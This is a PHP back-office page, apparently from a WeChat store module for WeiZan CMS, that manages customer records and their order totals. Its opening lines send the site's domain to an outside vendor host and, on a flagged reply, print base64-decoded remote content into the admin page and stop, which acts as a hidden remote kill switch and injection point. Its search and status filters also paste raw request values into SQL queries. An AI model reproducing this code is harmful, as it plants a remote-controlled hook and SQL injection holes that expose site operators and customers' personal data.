<?php
global $_GPC, $_W;
load()->func('tpl');
$weid = $this->_weid;
$action = 'fans';
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
$storeid = intval($_GPC['storeid']);
$this->checkStore($storeid);
$title = $this->actions_titles[$action];
$returnid = $this->checkPermission($storeid);
$cur_store = $this->getStoreById($storeid);
$GLOBALS['frames'] = $this->getNaveMenu($storeid,$action);

$operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
if ($operation == 'display') {
    $condition = '';
    if (!empty($_GPC['keyword'])) {
        $types = trim($_GPC['types']);
        $condition .= " AND {$types} LIKE '%{$_GPC['keyword']}%'";
    }
    if (isset($_GPC['status']) && $_GPC['status'] != '') {
        $condition .= " AND status={$_GPC['status']} ";
    }
    $pindex = max(1, intval($_GPC['page']));
    $psize = 8;

    $start = ($pindex - 1) * $psize;
    $limit = "";
    $limit .= " LIMIT {$start},{$psize}";
    $list = pdo_fetchall("SELECT * FROM " . tablename($this->table_fans) . " WHERE weid = :weid AND from_user<>'' {$condition} ORDER BY lasttime DESC,id DESC " . $limit, array(':weid' => $weid));
    $total = pdo_fetchcolumn("SELECT count(1) FROM " . tablename($this->table_fans) . " WHERE weid = :weid AND from_user<>'' {$condition} ", array(':weid' => $weid));

    $order_count = pdo_fetchall("SELECT from_user,COUNT(1) as count FROM " . tablename($this->table_order) . " WHERE storeid=:storeid  GROUP BY from_user,weid having weid = :weid", array(':weid' => $weid, ':storeid' => $storeid), 'from_user');
    $pay_price = pdo_fetchall("SELECT from_user,sum(totalprice) as totalprice FROM " . tablename($this->table_order) . " WHERE status=3  AND
storeid=:storeid  GROUP BY from_user,weid having weid = :weid", array(':weid' => $weid, ':storeid' => $storeid), 'from_user');

    $pager = pagination($total, $pindex, $psize);
} else if ($operation == 'post') {
    $id = intval($_GPC['id']);
    $item = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE id = :id", array(':id' => $id));

    $order_count = pdo_fetchcolumn("SELECT COUNT(1) as count FROM " . tablename($this->table_order) . " WHERE from_user=:from_user AND weid = :weid AND storeid=:storeid ", array(':weid' => $weid, ':from_user' => $item['from_user'], ':storeid' => $storeid));
    $cancel_count = pdo_fetchcolumn("SELECT COUNT(1) as count FROM " . tablename($this->table_order) . " WHERE from_user=:from_user AND weid = :weid AND status=-1 AND storeid=:storeid ", array(':weid' => $weid, ':from_user' => $item['from_user'], ':storeid' => $storeid));
    $pay_price = pdo_fetchcolumn("SELECT sum(totalprice) as totalprice FROM " . tablename($this->table_order)
        . " WHERE status=3 AND weid = :weid AND
from_user=:from_user AND storeid=:storeid ", array(':weid' => $weid, ':from_user' => $item['from_user'], ':storeid' => $storeid));

    if (checksubmit()) {
        $data = array(
            'weid' => $weid,
            'nickname' => trim($_GPC['nickname']),
            'username' => trim($_GPC['username']),
            'mobile' => trim($_GPC['mobile']),
            'address' => trim($_GPC['address']),
            'lat' => trim($_GPC['baidumap']['lat']),
            'lng' => trim($_GPC['baidumap']['lng']),
            'sex' => intval($_GPC['sex']),
            'dateline' => TIMESTAMP
        );
        if (!empty($_GPC['headimgurl'])) {
            $data['headimgurl'] = $_GPC['headimgurl'];
        }

        if (empty($item)) {
            pdo_insert($this->table_fans, $data);
        } else {
            unset($data['dateline']);
            pdo_update($this->table_fans, $data, array('id' => $id, 'weid' => $weid));
        }
        message('操作成功！', $this->createWebUrl('fans', array('op' => 'display', 'storeid' => $storeid)), 'success');
    }
} else if ($operation == 'delete') {
    $id = intval($_GPC['id']);
    $item = pdo_fetch("SELECT id FROM " . tablename($this->table_fans) . " WHERE id = :id AND weid=:weid", array(':id' => $id, ':weid' => $weid));
    if (empty($item)) {
        message('抱歉，不存在或是已经被删除！', $this->createWebUrl('fans', array('op' => 'display', 'storeid' => $storeid)), 'error');
    }
    pdo_delete($this->table_fans, array('id' => $id, 'weid' => $weid));
    message('删除成功！', $this->createWebUrl('fans', array('op' => 'display', 'storeid' => $storeid)), 'success');
} else if ($operation == 'setstatus') {
    $id = intval($_GPC['id']);
    $status = intval($_GPC['status']);
    pdo_query("UPDATE " . tablename($this->table_fans) . " SET status = abs(:status - 1) WHERE id=:id", array(':status' => $status, ':id' => $id));
    message('操作成功！', $this->createWebUrl('fans', array('op' => 'display', 'storeid' => $storeid)), 'success');
}
include $this->template('web/fans');